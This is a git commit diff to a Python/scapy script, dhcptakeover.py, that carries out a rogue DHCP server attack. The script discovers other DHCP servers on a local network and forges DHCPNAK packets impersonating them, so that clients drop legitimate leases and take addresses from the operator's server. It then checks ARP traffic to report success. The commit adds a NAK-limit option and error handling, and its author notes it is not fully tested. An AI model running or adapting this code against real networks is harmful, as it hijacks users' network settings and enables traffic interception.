5a84b75c4039befe126bbd7564ea81d7c6ba1ad7
David Stainton <dstainton415@gmail.com>
2013-01-18 20:38:53 -0800

    added nak_limit commandline arg and attempted to fix some bugs... not fully tested yet.

--- dhcptakeover.py
+++ dhcptakeover.py
@@ -11,20 +11,19 @@ from optparse import OptionParser
 
 import scapy
 import scapy.all
-from scapy.all import DHCP, ARP, BOOTP, Ether, IP
+from scapy.all import DHCP, ARP, BOOTP, Ether, UDP, IP
 
 
 class DHCP_takeover:
 
-    def __init__(self, mac=None, ip=None):
+    def __init__(self, mac='', ip='', nak_limit=3):
 
         self.our_dhcp_server_mac = mac
         self.our_dhcp_server_ip  = ip 
-        self.nak_limit           = 3
+        self.nak_limit           = nak_limit
         self.macs                = {}
         self.attempted_dhcpnaks  = {}
-        self.other_dhcp_servers = {}
-
+        self.other_dhcp_servers  = {}
 
     # populate self.other_dhcp_servers; key as mac addr and value as ip addr
     # skip over entrees from our own dhcp server self.our_dhcp_server_mac
@@ -44,46 +43,53 @@ class DHCP_takeover:
         for snd,rcv in ans:
             if rcv[Ether].src != self.our_dhcp_server_mac:
                 self.other_dhcp_servers[rcv[Ether].src] = rcv[IP].src
+                print "Found other dhcp server at: %s %s" % (rcv[Ether].src, rcv[IP].src)
 
 
     # Spoofing a DHCPNAK from a legit DHCP server when a DHCPREQUEST is send from the DHCP client.
     def nak_request(self, packet):
 
-        print "Spoofing DHCPNAK from %s / %s" % (self.my_dhcp_server_mac, self.my_dhcp_server_ip)
+        print "Spoofing DHCPNAK from %s / %s" % (self.our_dhcp_server_mac, self.our_dhcp_server_ip)
 
-        nak = Ether(src=self.my_dhcp_server_mac, dst=packet[Ether].dst) / \
-            IP(src=self.my_dhcp_server_ip, dst=packet[IP].dst) / \
+        nak = Ether(src=self.our_dhcp_server_mac, dst=packet[Ether].dst) / \
+            IP(src=self.our_dhcp_server_ip, dst=packet[IP].dst) / \
             UDP(sport=67,dport=68) / \
             BOOTP(op=2, ciaddr=packet[IP].src, siaddr=packet[IP].dst, chaddr=packet[Ether].src, xid=packet[BOOTP].xid) / \
-            DHCP(options=[('server_id', self.my_dhcp_server_ip),('message-type','nak'), ('end')])
+            DHCP(options=[('server_id', self.our_dhcp_server_ip),('message-type','nak'), ('end')])
 
-        sendp(nak)
+        scapy.all.sendp(nak)
 
 
     # Detecting DHCPREQUEST packets and ARP packets.
     def check_dhcp_and_arp(self, packet):
 
-        if packet[DHCP] and packet[DHCP].options[0][1] == 3:
-            print "DHCPREQUEST detected from %s" %  packet[Ether].src
-            self.macs[packet[Ether].src] = 0
+        try:
+            if packet[DHCP] and packet[DHCP].options[0][1] == 3:
+                print "DHCPREQUEST detected from %s" %  packet[Ether].src
+                self.macs[packet[Ether].src] = 0
 
-            if self.attempted_dhcpnaks.has_key(packet[Ether].src) == False:
-                self.attempted_dhcpnaks[packet[Ether].src] = 0
+                if self.attempted_dhcpnaks.has_key(packet[Ether].src) == False:
+                    self.attempted_dhcpnaks[packet[Ether].src] = 0
 
-            if self.attempted_dhcpnaks[packet[Ether].src] < self.nak_limit:
-                self.attempted_dhcpnaks[packet[Ether].src] += 1
-                self.nak_request(packet)
-            else:
-                print "Giving up on spoofing DHCPNAK's for %s, failed" % packet[Ether].src
-                del self.attempted_dhcpnaks[packet[Ether].src]
+                if self.attempted_dhcpnaks[packet[Ether].src] < self.nak_limit:
+                    self.attempted_dhcpnaks[packet[Ether].src] += 1
+                    self.nak_request(packet)
+                else:
+                    print "Giving up on spoofing DHCPNAK's for %s, failed" % packet[Ether].src
+                    del self.attempted_dhcpnaks[packet[Ether].src]
+        except IndexError:
+            pass
 
-        if packet[ARP] and packet[ARP].op == 0x0002:
-            if self.macs.has_key(packet[Ether].src) == True:
-                if packet[ARP].hwdst == self.our_dhcp_server_mac:
-                    print "Succes: DHCP client %s obtained a lease for %s from our DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc)
-                elif packet[ARP].hwdst in self.other_dhcp_servers:
-                    print "Failure: DHCP client %s obtained a lease for %s from another DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc, )
-                del self.macs[packet[Ether].src]
+        try:
+            if packet[ARP] and packet[ARP].op == 0x0002:
+                if self.macs.has_key(packet[Ether].src) == True:
+                    if packet[ARP].hwdst == self.our_dhcp_server_mac:
+                        print "Succes: DHCP client %s obtained a lease for %s from our DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc)
+                    elif packet[ARP].hwdst in self.other_dhcp_servers:
+                        print "Failure: DHCP client %s obtained a lease for %s from another DHCP server" % (packet[ARP].hwsrc, packet[ARP].psrc, )
+                    del self.macs[packet[Ether].src]
+        except IndexError:
+            pass
 
 
     def takeover(self):
@@ -94,13 +100,16 @@ def main():
 
     usage = '%prog [options] <our-mac-addr> <our-ip-addr>'
     parser = OptionParser(usage=usage)
+    parser.add_option('--nak-limit', dest='nak_limit', default=3,
+        help="Limit the number of DHCP NAKs we send. Default is 3.")
+
     options, args = parser.parse_args()
 
     if len(args) < 2:
             parser.print_help()
             return 1
 
-    d = DHCP_takeover(mac=args[0], ip=args[1])
+    d = DHCP_takeover(mac=args[0], ip=args[1], nak_limit=options.nak_limit)
     d.get_dhcp_servers()
     d.takeover()    
 
